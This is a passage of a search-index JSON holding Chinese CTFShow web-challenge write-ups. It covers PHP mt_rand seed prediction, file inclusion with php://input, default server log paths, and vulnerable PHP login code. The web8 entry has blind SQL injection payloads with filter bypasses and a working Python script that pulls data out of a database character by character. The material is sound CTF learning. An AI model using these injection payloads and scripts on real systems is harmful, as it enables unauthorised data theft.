<p>\u8fd9\u91cc\u5b58\u5728\u4e00\u4e2a\u4f2a\u968f\u673a\u6570\u6f0f\u6d1e\uff0c\u5728php\u4e2d\u6bcf\u4e00\u6b21\u8c03\u7528mt_rand()\u51fd\u6570\uff0c\u90fd\u4f1a\u68c0\u67e5\u4e00\u4e0b\u7cfb\u7edf\u6709\u6ca1\u6709\u64ad\u79cd\u3002\uff08\u64ad\u79cd\u4e3amt_srand()\u51fd\u6570\u5b8c\u6210\uff09\uff0c\u5f53\u968f\u673a\u79cd\u5b50\u751f\u6210\u540e\uff0c\u540e\u9762\u751f\u6210\u7684\u968f\u673a\u6570\u90fd\u4f1a\u6839\u636e\u8fd9\u4e2a\u968f\u673a\u79cd\u5b50\u751f\u6210\u3002\u6240\u4ee5\u540c\u4e00\u4e2a\u79cd\u5b50\u4e0b\uff0c\u968f\u673a\u6570\u7684\u5e8f\u5217\u662f\u76f8\u540c\u7684\uff0c\u8fd9\u5c31\u662f\u6f0f\u6d1e\u70b9\u3002</p> <p>\u4e0a\u9762\u5df2\u7ecf\u7528\u4e00\u4e2a\u56fa\u5b9a\u6570\u5b57\u64ad\u79cd\u4e86\u968f\u673a\u6570\uff0cmt_srand(372619038)\uff0c\u6240\u4ee5\u53ea\u8981\u5728\u540c\u4e00\u7684php\u7248\u672c\u4e2d\uff0c\u590d\u73b0\u4e00\u4e0b\uff0c\u4e5f\u7528mt_srand(372619038)\uff0c\u64ad\u79cd\u968f\u673a\u6570\u79cd\u5b50\uff0c\u518d\u7528mt_rand()\u751f\u6210\u968f\u673a\u6570\uff0c\u5f97\u5230\u7684\u968f\u673a\u6570\u90fd\u662f\u4e00\u6837\u7684</p> <p>\u6240\u4ee5\u7b2c\u4e00\u6b65\uff0c\u7528Burp\u968f\u4fbf\u4f20\u4e00\u4e2ar\u8fc7\u53bb\uff0c\uff0c\u67e5\u770b\u7f51\u7edc\u4e2d\u7684\u54cd\u5e94\u5305\uff0c\u83b7\u53d6\u9776\u673aphp\u7248\u672c\uff0c\u518d\u5728\u81ea\u5df1\u4e3b\u673a\u4e0a\u642d\u5efa\u540c\u6837\u7248\u672c\u7684php\u73af\u5883\uff0c\u64ad\u79cd\u540c\u6837\u7684\u968f\u673a\u6570\u79cd\u5b50\uff0c\u751f\u6210\u7684\u968f\u673a\u6570\u5f53\u4f5c\u53c2\u6570r\u7684\u503c\u53d1\u9001\u8bf7\u6c42\uff0c\u5373\u53ef\u83b7\u53d6flag\u3002r\u503c\u4e3a\uff1aurl/?r=1155388967</p> <p>\u5176\u5b9e\u8fd9\u513f\u7528\u4e00\u4e9b\u5728\u7ebf\u7684php\u8fd0\u884c\u5e73\u53f0\u5c31\u53ef\u4ee5\u3002</p>"},{"location":"WEB/CTFShow/CTFShow-%E7%88%86%E7%A0%B4/#_3","title":"\u5b98\u65b9\u8bf4\u660e\uff1a","text":"<p>mt_scrand(seed)\u8fd9\u4e2a\u51fd\u6570\u7684\u610f\u601d\uff0c\u662f\u901a\u8fc7\u5206\u53d1seed\u79cd\u5b50\uff0c\u7136\u540e\u79cd\u5b50\u6709\u4e86\u540e\uff0c\u9760mt_rand()\u751f\u6210\u968f\u673a \u6570\u3002 \u63d0\u793a\uff1a\u4ece PHP 4.2.0 \u5f00\u59cb\uff0c\u968f\u673a\u6570\u751f\u6210\u5668\u81ea\u52a8\u64ad\u79cd\uff0c\u56e0\u6b64\u6ca1\u6709\u5fc5\u8981\u4f7f\u7528\u8be5\u51fd\u6570 \u56e0\u6b64\u4e0d\u9700\u8981\u64ad\u79cd\uff0c\u5e76\u4e14\u5982\u679c\u8bbe\u7f6e\u4e86 seed\u53c2\u6570 \u751f\u6210\u7684\u968f\u673a\u6570\u5c31\u662f\u4f2a\u968f\u673a\u6570\uff0c\u610f\u601d\u5c31\u662f\u6bcf\u6b21\u751f\u6210\u7684\u968f\u673a\u6570 \u662f\u4e00\u6837\u7684\u3002</p>"},{"location":"WEB/CTFShow/CTFShow-%E7%88%86%E7%A0%B4/#web-25_1","title":"Web 25","text":"<p>\u4ee3\u7801\u5982\u4e0b\uff1a</p> PHP<pre><code>&lt;?php\nerror_reporting(0);\n\ninclude(\"flag.php\");\nif (isset($_GET['r'])) {\n    $r = $_GET['r'];\n    mt_srand(hexdec(substr(md5($flag), 0, 8)));\n    $rand = intval($r) - intval(mt_rand());\n    if ((!$rand)) {\n        if ($_COOKIE['token'] == (mt_rand() + mt_rand())) {\n            echo $flag;\n        }\n    } else {\n        echo $rand;\n    }\n} else {\n    highlight_file(__FILE__);\n    echo system('cat /proc/version');\n}\n?&gt;\n</code></pre>"},{"location":"WEB/CTFShow/CTFShow-%E7%88%86%E7%A0%B4/#_4","title":"\u901a\u4e49\u7075\u7801\uff1a","text":"<p>\u8be5PHP\u51fd\u6570\u7684\u529f\u80fd\u662f\uff1a</p> <ol> <li>\u5173\u95ed\u9519\u8bef\u62a5\u544a\u3002</li> <li>\u5305\u542b\u540d\u4e3a\"flag.php\"\u7684\u6587\u4ef6\u3002</li> <li>\u5982\u679c\u5728GET\u53c2\u6570\u4e2d\u5b58\u5728\"r\"\uff0c\u5219\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\uff1a</li> <li>\u5c06\"r\"\u8d4b\u503c\u7ed9\u53d8\u91cf$r\u3002</li> <li>\u4f7f\u7528md5\u51fd\u6570\u751f\u6210\u4e00\u4e2a\u968f\u673a\u6570\uff0c\u5e76\u4f7f\u7528substr\u51fd\u6570\u63d0\u53d6\u524d8\u4f4d\u4f5c\u4e3amt_rand\u51fd\u6570\u7684\u79cd\u5b50\u3002</li> <li>\u8ba1\u7b97<code>$r</code>\u4e0e<code>mt_rand</code>\u51fd\u6570\u751f\u6210\u7684\u968f\u673a\u6570\u7684\u5dee\u503c\uff0c\u5e76\u8d4b\u503c\u7ed9\u53d8\u91cf<code>$rand</code>\u3002</li> <li>\u5982\u679c$rand\u4e3a0\uff0c\u5219\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\uff1a<ul> <li>\u68c0\u67e5$_COOKIE['token']\u662f\u5426\u7b49\u4e8e\u4e24\u4e2a\u968f\u673a\u6570\u4e4b\u548c\u3002</li> <li>\u5982\u679c\u76f8\u7b49\uff0c\u5219\u8f93\u51fa$flag\u3002</li> </ul> </li> <li>\u5426\u5219\uff0c\u8f93\u51fa$rand\u3002</li> <li>\u5982\u679c\u5728GET\u53c2\u6570\u4e2d\u4e0d\u5b58\u5728\"r\"\uff0c\u5219\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\uff1a</li> <li>\u9ad8\u4eae\u663e\u793a\u5f53\u524d\u6587\u4ef6\u3002</li> <li>\u4f7f\u7528system\u51fd\u6570\u6267\u884c\"cat /proc/version\"\u547d\u4ee4\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002</li> </ol> <p>\u6ce8\u610f\uff1a\u8be5\u51fd\u6570\u5b58\u5728\u5b89\u5168\u98ce\u9669\uff0c\u56e0\u4e3a\u5b83\u4f7f\u7528\u4e86\u4e0d\u5b89\u5168\u7684\u968f\u673a\u6570\u751f\u6210\u65b9\u6cd5\uff0c\u5e76\u4e14\u5728GET\u53c2\u6570\u4e2d\u76f4\u63a5\u8f93\u51fa\u4e86\u654f\u611f\u4fe1\u606f\u3002</p>"},{"location":"WEB/CTFShow/CTFShow-%E7%88%86%E7%A0%B4/#wp","title":"WP\uff1a","text":"<p>\u4e0d\u4f1a\u505a\u2026\u2026\u8981\u7528\u5230\u5de5\u5177<code>php mt seed</code>\uff0c\u5148\u8df3\u8fc7\u8fd9\u4e2a\u5427\u3002</p>"},{"location":"WEB/CTFShow/CTFShow-%E7%88%86%E7%A0%B4/#web-27","title":"Web 27","text":"<p>\u8fd9\u4e2a\u9898\u5f88\u6709\u610f\u601d\u3002</p> <p>\u6574\u4f53\u6d41\u7a0b\u6ca1\u4ec0\u4e48\uff0c\u4f46\u662f\u6211\u5728\u505a\u7684\u65f6\u5019\u9047\u5230\u4e86\u4e00\u4e2a\u95ee\u9898\uff1aBurp\u6293\u4e0d\u5230\u201cchechdb.php\u201d\u6570\u636e\u5305\uff0cfirefox\u6d4f\u89c8\u5668\u663e\u793a\u72b6\u6001\u7801\u662f\u201c\u62e6\u622a\u201d\uff0c\u4f46\u662f\u7528\u522b\u7684\u6d4f\u89c8\u5668\u5c31\u597d\u4e86\u3002</p> <p>\u7136\u540e\u6478\u7d22\u4e86\u534a\u5929\uff0c\u6700\u540e\u5728\u5b9e\u9a8c\u5ba4\u5b66\u957f\u548cCTFShow\u5b98\u65b9\u7b54\u7591\u4eba\u5458\u5e2e\u52a9\u4e0b\uff0c\u7ec8\u4e8e\u77e5\u9053\u4e86\u539f\u56e0\uff1ahttp\u901a\u8fc7js\u5411https\u53d1\u9001ajax\u8bf7\u6c42\u4f1a\u88ab\u8de8\u57df\u62e6\u622a</p> <p>\u8fd9\u53e5\u8bdd\u7684\u610f\u601d\u662f\uff0c\u5728\u7f51\u9875\u5f00\u53d1\u4e2d\uff0c\u5982\u679c\u4f60\u7684\u7f51\u9875\u662f\u901a\u8fc7 HTTP \u534f\u8bae\u52a0\u8f7d\u7684\uff08\u5373\u975e\u5b89\u5168\u7684\u7f51\u9875\uff09\uff0c\u800c\u4f60\u5c1d\u8bd5\u4f7f\u7528 JavaScript \u4ee3\u7801\u901a\u8fc7 AJAX\uff08Asynchronous JavaScript and XML\uff09\u5411\u53e6\u4e00\u4e2a\u4f7f\u7528 HTTPS \u534f\u8bae\uff08\u5373\u5b89\u5168\u7684\u7f51\u9875\uff09\u7684\u670d\u52a1\u5668\u53d1\u9001\u8bf7\u6c42\uff0c\u6d4f\u89c8\u5668\u4f1a\u963b\u6b62\u8fd9\u4e2a\u8bf7\u6c42\u3002\u8fd9\u662f\u56e0\u4e3a\u6d4f\u89c8\u5668\u7684\u540c\u6e90\u7b56\u7565\uff08Same-Origin Policy\uff09\u7684\u9650\u5236\uff0c\u5b83\u8981\u6c42\u7f51\u9875\u4e2d\u7684\u6240\u6709\u8d44\u6e90\u8bf7\u6c42\uff08\u6bd4\u5982 JavaScript\u3001CSS\u3001\u56fe\u7247\u3001XHR\u7b49\uff09\u90fd\u5fc5\u987b\u4e0e\u5f53\u524d\u7f51\u9875\u5177\u6709\u76f8\u540c\u7684\u534f\u8bae\u3001\u57df\u540d\u548c\u7aef\u53e3\u3002</p> <p>\u56e0\u6b64\uff0c\u5982\u679c\u7f51\u9875\u662f\u901a\u8fc7 HTTP \u534f\u8bae\u52a0\u8f7d\u7684\uff0c\u800c\u4f60\u5c1d\u8bd5\u5411\u4f7f\u7528 HTTPS \u534f\u8bae\u7684\u670d\u52a1\u5668\u53d1\u9001\u8bf7\u6c42\uff0c\u6d4f\u89c8\u5668\u4f1a\u8ba4\u4e3a\u8fd9\u662f\u8de8\u57df\u8bf7\u6c42\uff0c\u4f1a\u62e6\u622a\u8be5\u8bf7\u6c42\uff0c\u4ee5\u4fdd\u62a4\u7528\u6237\u7684\u5b89\u5168\u548c\u9690\u79c1\u3002\u8981\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u4e00\u79cd\u5e38\u89c1\u7684\u65b9\u6cd5\u662f\u786e\u4fdd\u7f51\u9875\u548c\u670d\u52a1\u5668\u4f7f\u7528\u76f8\u540c\u7684\u534f\u8bae\uff0c\u5373\u90fd\u662f HTTP \u6216\u90fd\u662f HTTPS\u3002</p> <p>\u4e3a\u4ec0\u4e48\u540c\u4e00\u73af\u5883\u4e0b\uff0cfirefox\u4f1a\u88ab\u62e6\u622a\uff0c\u800c\u7528\u8c37\u6b4c\u6d4f\u89c8\u5668\u5c31\u4e0d\u4f1a\u88ab\u62e6\u622a\u5462\uff1f</p> <p>\u5728\u540c\u4e00\u73af\u5883\u4e0b\uff0c\u4e0d\u540c\u6d4f\u89c8\u5668\u5bf9\u4e8e\u8de8\u57df\u8bf7\u6c42\u7684\u5904\u7406\u53ef\u80fd\u4f1a\u6709\u6240\u4e0d\u540c\uff0c\u8fd9\u53ef\u80fd\u662f\u7531\u4e8e\u6d4f\u89c8\u5668\u5b9e\u73b0\u540c\u6e90\u7b56\u7565\u7684\u65b9\u5f0f\u4e0d\u540c\u3001\u5b89\u5168\u7b56\u7565\u7684\u5dee\u5f02\u7b49\u539f\u56e0\u5bfc\u81f4\u7684\u3002</p> <p>\u867d\u7136\u5927\u591a\u6570\u4e3b\u6d41\u6d4f\u89c8\u5668\u90fd\u9075\u5faa\u540c\u6e90\u7b56\u7565\uff0c\u4f46\u662f\u5b83\u4eec\u53ef\u80fd\u5728\u5b9e\u73b0\u7ec6\u8282\u4e0a\u6709\u6240\u4e0d\u540c\uff0c\u5305\u62ec\u5bf9\u4e8e\u8de8\u534f\u8bae\uff08HTTP\u4e0eHTTPS\uff09\u3001\u8de8\u57df\u540d\uff08\u4e0d\u540c\u57df\u540d\uff09\u8bf7\u6c42\u7684\u5904\u7406\u65b9\u5f0f\u53ef\u80fd\u5b58\u5728\u5dee\u5f02\u3002</p> <p>\u56e0\u6b64\uff0c\u67d0\u4e9b\u6d4f\u89c8\u5668\u53ef\u80fd\u4f1a\u66f4\u4e25\u683c\u5730\u6267\u884c\u540c\u6e90\u7b56\u7565\uff0c\u62e6\u622a\u8de8\u57df\u8bf7\u6c42\uff0c\u800c\u5176\u4ed6\u4e00\u4e9b\u6d4f\u89c8\u5668\u53ef\u80fd\u4f1a\u5141\u8bb8\u67d0\u4e9b\u60c5\u51b5\u4e0b\u7684\u8de8\u57df\u8bf7\u6c42\u901a\u8fc7\u3002\u8fd9\u53ef\u80fd\u662f\u4f60\u89c2\u5bdf\u5230 Firefox \u548c Chrome \u5728\u76f8\u540c\u73af\u5883\u4e0b\u5904\u7406\u8de8\u57df\u8bf7\u6c42\u4e0d\u4e00\u81f4\u7684\u539f\u56e0\u4e4b\u4e00\u3002</p>"},{"location":"WEB/CTFShow/CTFShow-%E7%88%86%E7%A0%B4/#web-28","title":"Web 28","text":"<p>\u6293\u5305\u770b\u5230\uff0c\u8fdb\u5165\u7f51\u7ad9\u76f4\u63a5\u8fdb\u884c\u4e00\u4e2a302\u8df3\u8f6c\uff0c\u8df3\u8f6c\u5230\u4e86url/0/1/2.txt\u3002</p> <p>CTFShow\u63d0\u793a\uff1a</p> <p>\u901a\u8fc7\u66b4\u529b\u7834\u89e3\u76ee\u5f55/0-100/0-100/\u770b\u8fd4\u56de\u6570\u636e\u5305</p> <p>\u7206\u7834\u7684\u65f6\u5019\u53bb\u63892.txt \u4ec5\u4ec5\u7206\u7834\u76ee\u5f55\u5373\u53ef</p>"},{"location":"WEB/CTFShow/CTFshow-web/","title":"CTFshow-WEB","text":""},{"location":"WEB/CTFShow/CTFshow-web/#web3","title":"web3 \u6587\u4ef6\u5305\u542b","text":"<p>ctf.show WEB\u6a21\u5757\u7684\u7b2c3\u5173\u662f\u4e00\u4e2a\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e,<code>include()</code>\u51fd\u6570\u5305\u542b\u7684\u6587\u4ef6\u4f1a\u88ab\u6267\u884c\uff0c\u6211\u4eec\u4f7f\u7528PHP\u4f2a\u534f\u8bae\u914d\u5408\u6293\u5305\u5de5\u5177\u8fdb\u884c\u547d\u4ee4\u6267\u884c\uff0c\u4ece\u800c\u83b7\u53d6flag</p> <p>\u8fd9\u4e00\u5173\u7684flag\u5c31\u5b58\u653e\u5728\u7f51\u7ad9\u8ddf\u8def\u5f84\u4e0b\u7684\u6587\u4ef6\u4e2d</p> <p><code>php://input</code> \u53ef\u4ee5\u8bbf\u95ee\u8bf7\u6c42\u7684\u539f\u59cb\u6570\u636e\uff0c\u914d\u5408\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u53ef\u4ee5\u5c06post\u8bf7\u6c42\u4f53\u4e2d\u7684\u5185\u5bb9\u5f53\u505a\u6587\u4ef6\u5185\u5bb9\u6267\u884c,<code>enctype=multipart/form-data</code>\u65f6,<code>php:/input</code>\u5c06\u4f1a\u65e0\u6548</p> <p></p>"},{"location":"WEB/CTFShow/CTFshow-web/#web4","title":"web4 \u65e5\u5fd7\u9ed8\u8ba4\u8def\u5f84","text":"<ol> <li><code>apache+Linux</code> \u65e5\u5fd7\u9ed8\u8ba4\u8def\u5f84 /etc/httpd/logs/access_log /var/log/httpd/access_log</li> <li><code>apache+win2003</code> \u65e5\u5fd7\u9ed8\u8ba4\u8def\u5f84 D:\\xampp\\apache\\logs\\access.log D:\\xampp\\apache\\logs\\error.log</li> <li><code>IIS6.0+win2003</code> \u9ed8\u8ba4\u65e5\u5fd7\u6587\u4ef6 C:\\WINDOWS\\system32\\Logfiles</li> <li><code>IIS7.0+win2003</code> \u9ed8\u8ba4\u65e5\u5fd7\u6587\u4ef6 %SystemDrive%\\inetpub\\logs\\LogFiles</li> <li><code>nginx</code> \u65e5\u5fd7\u6587\u4ef6 \u65e5\u5fd7\u6587\u4ef6\u5728\u7528\u6237\u5b89\u88c5\u76ee\u5f55 logs \u76ee\u5f55\u4e0b /var/log/nginx/access.log</li> </ol>"},{"location":"WEB/CTFShow/CTFshow-web/#web8","title":"web8 \u7f16\u5199\u811a\u672c\u6ce8\u5165(\u5f85\u89e3\u51b3)","text":"Text Only<pre><code>\u7b2c8\u5173\u662f\u4e00\u4e2aSQL \u6ce8\u5165\u6f0f\u6d1e, \u6ce8\u5165\u70b9\u662f\u6570\u503c\u578b, \u6ce8\u5165\u7c7b\u578b\u63a8\u8350\u4f7f\u7528\u5e03\u5c14\u76f2\u6ce8,\u6b64\u5173\u5361\u8fc7\u6ee4\u4e86\u7a7a\u683c,\u9017\u53f7,and,union\u7b49\u5173\u952e\u5b57, \n\n1. \u8fc7\u6ee4\u7a7a\u683c, \u53ef\u4ee5\u4f7f\u7528\u62ec\u53f7() \u6216\u8005\u6ce8\u91ca/**/ \u7ed5\u8fc7\n2. \u8fc7\u6ee4and, \u53ef\u4ee5\u4f7f\u7528or\u66ff\u4ee3\n3. \u8fc7\u6ee4union, \u53ef\u4ee5\u7528\u76f2\u6ce8\u66ff\u4ee3\u8054\u5408\u6ce8\u5165\n4. \u8fc7\u6ee4\u9017\u53f7, \u53ef\u4ee5\u4f7f\u7528\u7279\u6b8a\u8bed\u6cd5\u7ed5\u8fc7, \u6bd4\u5982:substr(database(),1,1) \u53ef\u4ee5\u7528substr(database() from 1 for 1)\u6765\u4ee3\u66ff\n</code></pre> <p>\u9996\u5148\u786e\u5b9a\u6ce8\u5165\u70b9, \u8f93\u5165\u4ee5\u4e0bpayload\u4f7fSQL\u6052\u6210\u7acb</p> COBOL<pre><code>?id=-1/**/or/**/true\n</code></pre> <p>\u7531\u4e8eSQL\u6052\u6210\u7acb, \u6570\u636e\u5e93\u5c06\u67e5\u8be2\u51fa\u8868\u4e2d\u7684\u6240\u6709\u5185\u5bb9, \u5e76\u8fd4\u56de\u5230\u524d\u7aef\u5c55\u793a</p> <p>\u518d\u8f93\u5165\u4e00\u4e0bpayload \u4f7fSQL\u6052\u4e0d\u6210\u7acb</p> COBOL<pre><code>?id=-1/**/or/**/false\n</code></pre> <p>\u7531\u4e8eSQL\u6052\u4e0d\u6210\u7acb, \u6570\u636e\u5e93\u67e5\u8be2\u4e0d\u5230\u4efb\u4f55\u6570\u636e, \u4ece\u800c\u5bfc\u81f4\u9875\u9762\u7a7a\u663e\u793a</p> <p>\u7531\u4ee5\u4e0a\u8fd4\u56de\u7ed3\u679c\u53ef\u77e5, \u8be5\u9875\u9762\u5b58\u5728SQL\u6ce8\u5165, \u6ce8\u5165\u70b9\u4e3a\u6570\u503c\u578b\u6ce8\u5165</p> <p>\u63a5\u4e0b\u6765\u8fdb\u884c\u8131\u5e93, \u7531\u4e8e\u76f2\u6ce8\u8131\u5e93\u6bd4\u8f83\u590d\u6742, \u6b64\u5904\u6211\u4eec\u6784\u9020Python\u811a\u672c\u8fdb\u884c\u81ea\u52a8\u5316\u8131\u5e93, \u6ce8\u610fpayload\u4e2d\u7684\u5b57\u7b26\u4e32\u4e0d\u8981\u6362\u884c, \u5426\u5219\u53ef\u80fd\u4f1a\u51fa\u95ee\u9898</p> Python<pre><code>import requests\n\nurl = 'http://4b5e1b2a-d612-4eb0-b228-c16500380436.challenge.ctf.show/index.php?id=-1/**/or/**/'\nname = ''\n\n# \u5faa\u73af50\u6b21(\u5faa\u73af\u6b21\u6570\u6309\u7167\u8fd4\u56de\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u81ea\u5b9a\u4e49)\nfor i in range(1, 50):\n    # \u83b7\u53d6\u5f53\u524d\u4f7f\u7528\u7684\u6570\u636e\u5e93\n    # payload = 'ascii(substr(database()from/**/%d/**/for/**/1))=%d'\n    # \u83b7\u53d6\u5f53\u524d\u6570\u636e\u5e93\u7684\u6240\u6709\u8868\n    # payload = 'ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%d/**/for/**/1))=%d'\n    # \u83b7\u53d6flag\u8868\u7684\u5b57\u6bb5\n    # payload = 'ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%d/**/for/**/1))=%d'\n    # \u83b7\u53d6flag\u8868\u7684\u6570\u636e\n    payload = 'ascii(substr((select/**/flag/**/from/**/flag)from/**/%d/**/for/**/1))=%d'\n    count = 0\n    print('\u6b63\u5728\u83b7\u53d6\u7b2c %d \u4e2a\u5b57\u7b26' % i)\n    # \u622a\u53d6SQL\u67e5\u8be2\u7ed3\u679c\u7684\u6bcf\u4e2a\u5b57\u7b26, \u5e76\u5224\u65ad\u5b57\u7b26\u5185\u5bb9\n    for j in range(31, 128):\n        result = requests.get(url + payload % (i, j))\n\n        if 'If' in result.text:\n            name += chr(j)\n            print('\u6570\u636e\u5e93\u540d/\u8868\u540d/\u5b57\u6bb5\u540d/\u6570\u636e: %s' % name)\n            break\n\n        # \u5982\u679c\u67d0\u4e2a\u5b57\u7b26\u4e0d\u5b58\u5728,\u5219\u505c\u6b62\u7a0b\u5e8f\n        count += 1\n        if count &gt;= (128 - 31):\n            exit()\n</code></pre> <p>\u6ce8\u91ca\uff1a</p> <p>\u8be5Python\u51fd\u6570\u7684\u4e3b\u8981\u76ee\u7684\u662f\u5229\u7528SQL\u6ce8\u5165\u6f0f\u6d1e\u4ece\u76ee\u6807Web\u5e94\u7528\u7a0b\u5e8f\u4e2d\u83b7\u53d6\u7279\u5b9a\u7684\u6570\u636e\uff08\u5728\u8fd9\u91cc\u662f\u540d\u4e3a<code>flag</code>\u7684\u5b57\u6bb5\u4e2d\u7684\u6570\u636e\uff09\u3002\u51fd\u6570\u6267\u884c\u7684\u5177\u4f53\u6b65\u9aa4\u5982\u4e0b\uff1a</p> <ol> <li>\u5bfc\u5165requests\u5e93\uff1arequests\u662f\u4e00\u4e2a\u7528\u4e8e\u53d1\u9001HTTP\u8bf7\u6c42\u7684Python\u5e93\uff0c\u8fd9\u91cc\u7528\u6765\u5411\u76ee\u6807URL\u53d1\u9001GET\u8bf7\u6c42\u3002</li> <li>\u8bbe\u7f6eURL\u548c\u53d8\u91cfname\uff1a\u5b9a\u4e49\u4e86\u5177\u6709SQL\u6ce8\u5165\u70b9\u7684URL\u548c\u4e00\u4e2a\u7a7a\u5b57\u7b26\u4e32<code>name</code>\uff0c\u8fd9\u4e2a\u5b57\u7b26\u4e32\u5c06\u7528\u4e8e\u5b58\u50a8\u6700\u7ec8\u63d0\u53d6\u7684\u6570\u636e\u3002</li> <li>\u5faa\u73af\u904d\u5386\u5b57\u7b26\uff1a\u901a\u8fc7\u4e00\u4e2a\u5916\u5c42\u5faa\u73af\uff08\u8303\u56f4\u57281\u523050\u4e4b\u95f4\uff09\u6765\u9010\u4e2a\u83b7\u53d6\u67e5\u8be2\u7ed3\u679c\u4e2d\u7684\u5b57\u7b26\u3002\u8fd9\u91cc\u7684\u5faa\u73af\u6b21\u6570\u53ef\u4ee5\u6839\u636e\u5b9e\u9645\u8fd4\u56de\u5b57\u7b26\u4e32\u957f\u5ea6\u8fdb\u884c\u8c03\u6574\u3002</li> <li>\u6784\u9020Payload\uff1a\u5728\u811a\u672c\u6ce8\u91ca\u90e8\u5206\u5217\u51fa\u4e86\u56db\u79cd\u4e0d\u540c\u7684payload\uff0c\u5b83\u4eec\u5206\u522b\u7528\u4e8e\u83b7\u53d6\u5f53\u524d\u4f7f\u7528\u7684\u6570\u636e\u5e93\u3001\u6570\u636e\u5e93\u7684\u6240\u6709\u8868\u3001flag\u8868\u7684\u5b57\u6bb5\u4ee5\u53caflag\u8868\u7684\u6570\u636e\u3002\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528\u7684\u662f\u6700\u540e\u4e00\u4e2apayload\uff0c\u7528\u4e8e\u83b7\u53d6<code>flag</code>\u8868\u4e2d\u7684\u6570\u636e\u3002</li> <li>\u5185\u5c42\u5faa\u73af\u5224\u65ad\u5b57\u7b26\uff1a\u5bf9ASCII\u7801\u503c\u4ece31\u5230127\u7684\u6bcf\u4e00\u4e2a\u5b57\u7b26\u8fdb\u884c\u904d\u5386\uff1a</li> <li>\u53d1\u9001GET\u8bf7\u6c42\uff1a\u6839\u636e\u5f53\u524d\u7684\u5faa\u73af\u7d22\u5f15i\u548cASCII\u7801\u503cj\u6784\u9020\u5e76\u53d1\u9001\u5e26\u6709payload\u7684GET\u8bf7\u6c42\u3002</li> <li>\u5224\u65ad\u54cd\u5e94\u5185\u5bb9\uff1a\u5982\u679c\u54cd\u5e94\u6587\u672c\u5305\u542b\u5b57\u7b26\u4e32'If'\uff0c\u5219\u8bf4\u660e\u627e\u5230\u4e86\u6b63\u786e\u7684\u5b57\u7b26\uff0c\u5c06\u5176\u5bf9\u5e94\u7684ASCII\u7801\u8f6c\u6362\u4e3a\u5b57\u7b26\u540e\u6dfb\u52a0\u5230<code>name</code>\u53d8\u91cf\u4e2d\uff0c\u5e76\u8f93\u51fa\u5f53\u524d\u5df2\u83b7\u53d6\u7684\u90e8\u5206\u4fe1\u606f\u3002</li> <li>\u8ba1\u6570\u4e0e\u9000\u51fa\u6761\u4ef6\uff1a\u82e5\u8fde\u7eed\u904d\u5386\u5b8c\u6240\u6709\u53ef\u80fd\u7684ASCII\u7801\u503c\u4ecd\u672a\u627e\u5230\u5339\u914d\u9879\uff0c\u5219\u8ba4\u4e3a\u8be5\u4f4d\u7f6e\u4e0d\u5b58\u5728\u5b57\u7b26\uff0c\u8ba1\u6570\u5668count\u52a0\u4e00\u3002\u5f53count\u8fbe\u5230\u4e00\u5b9a\u9608\u503c\u65f6\uff08\u8fd9\u91cc\u662f98\uff0c\u8ba1\u7b97\u65b9\u6cd5\u4e3a(128 - 31)\uff09\uff0c\u7a0b\u5e8f\u4f1a\u7ec8\u6b62\u8fd0\u884c\uff0c\u9632\u6b62\u9677\u5165\u65e0\u9650\u5faa\u73af\u3002</li> <li>\u6700\u7ec8\u8f93\u51fa\uff1a\u5f53\u5faa\u73af\u7ed3\u675f\u540e\uff0c<code>name</code>\u53d8\u91cf\u5c06\u5305\u542b\u901a\u8fc7SQL\u6ce8\u5165\u83b7\u53d6\u5230\u7684flag\u6570\u636e\uff0c\u5e76\u5728\u6bcf\u6b21\u627e\u5230\u65b0\u5b57\u7b26\u65f6\u5373\u65f6\u8f93\u51fa\u3002</li> </ol> <p>\u603b\u7ed3\uff1a\u6b64\u51fd\u6570\u901a\u8fc7\u6784\u9020SQL\u6ce8\u5165payload\u5e76\u53d1\u9001HTTP\u8bf7\u6c42\uff0c\u9010\u6b65\u63ed\u793a\u548c\u62fc\u63a5\u76ee\u6807\u6570\u636e\u5e93\u4e2d<code>flag</code>\u8868\u7684\u7279\u5b9a\u6570\u636e\u3002</p> <p>table_name=0x666C6167\u8fd9\u91cc\u662f\u8868\u540d\u7b49\u4e8eflag,flag\u8f6c\u4e3a\u5341\u516d\u8fdb\u5236\u7f16\u7801\u5f62\u5f0f\uff0cox\u662f\u5341\u516d\u8fdb\u5236\u524d\u7f00</p> <p>\u7591\u95ee\uff1a1. \u4e3a\u4ec0\u4e48\u898116\u8fdb\u5236\u7f16\u7801</p>"},{"location":"WEB/CTFShow/CTFshow-web/#web9-sqlmd5passwordtrue","title":"web9 sql\u6ce8\u5165\uff1a<code>md5($password,true)</code>","text":"<p>\u9996\u5148<code>robots.txt</code>\u5f97\u5230\u6e90\u7801</p> PHP<pre><code>&lt;?php\n$flag = \"\";\n$password = $_POST['password'];\nif (strlen($password) &gt; 10) {\n    die(\"password error\");\n}\n$sql = \"select * from user where username ='admin' and password ='\" . md5($password, true) . \"'\";\n$result = mysqli_query($con, $sql);\nif (mysqli_num_rows($result) &gt; 0) {\n    while ($row = mysqli_fetch_assoc($result)) {\n        echo \"\u767b\u9646\u6210\u529f&lt;br&gt;\";\n        echo $flag;\n    }\n}\n</code></pre> <p>\u70b9\u51fb\u9605\u8bfb\u539f\u6587\uff1asql\u6ce8\u5165\uff1amd5($password,true)</p> <p>\u4ecb\u7ecd\u4e00\u4e0b md5 \u8fd9\u4e2a\u51fd\u6570\u3002</p> <p>md5(string,raw)</p> \u53c2\u6570\u63cf\u8ff0string\u5fc5\u9700\u3002\u8981\u8ba1\u7b97\u7684\u5b57\u7b26\u4e32\u3002raw<p>\u53ef\u9009\u3002</p><ul><li>\u9ed8\u8ba4\u4e0d\u5199\u4e3a FALSE\u300232 \u4f4d 16 \u8fdb\u5236\u7684\u5b57\u7b26\u4e32</li><li>TRUE\u300216 \u4f4d\u539f\u59cb\u4e8c\u8fdb\u5236\u683c\u5f0f\u7684\u5b57\u7b26\u4e32</li></ul> Text Only<pre><code>content: 